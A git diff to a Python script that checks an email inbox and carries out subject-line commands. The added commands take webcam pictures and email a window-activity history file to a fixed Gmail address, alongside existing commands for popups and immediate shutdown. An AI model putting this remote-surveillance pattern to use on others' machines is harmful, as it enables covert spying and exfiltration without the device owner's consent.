@@ -1,3 +1,6 @@
+from camera_capture import CameraCapture
+from window_monitoring import WindowMonitoring
+from emailpassword import email_password, email_sender
 import tkinter as tk
 from tkinter import messagebox
 import imaplib
@@ -8,7 +11,6 @@ import os
 def show_popup(message):
     # Create the root window
     root = tk.Tk()
-    root.withdraw()  # Hide the root window
 
     # Show the popup message box
     messagebox.showinfo("Popup Message", message)
@@ -43,10 +45,20 @@ def email_listener(username, password):
                         msg = email.message_from_bytes(raw_email)
                         subject = msg['Subject']
 
-                        if "MESSAGE:" in subject:
+                        if "-MESSAGE-:" in subject:
                             show_popup(subject)
-                        elif "PC SHUTDOWN" == subject:
+                        elif "-PC SHUTDOWN-" == subject:
                             os.system("shutdown /s /t 0")
+                        elif "-PICTURE-" == subject:
+                            CameraCapture()
+                        elif "-HISTORY-" == subject:
+                            WindowMonitoring.send_email(email_sender, 
+                            email_password, 
+                            "projektykandl@gmail.com",
+                            f"Window History",
+                            "An suspicious activity has been recorded on your device.",
+                            "window_history.txt"
+                            )
 
             # Sleep to wait before checking for new emails again
             time.sleep(5)
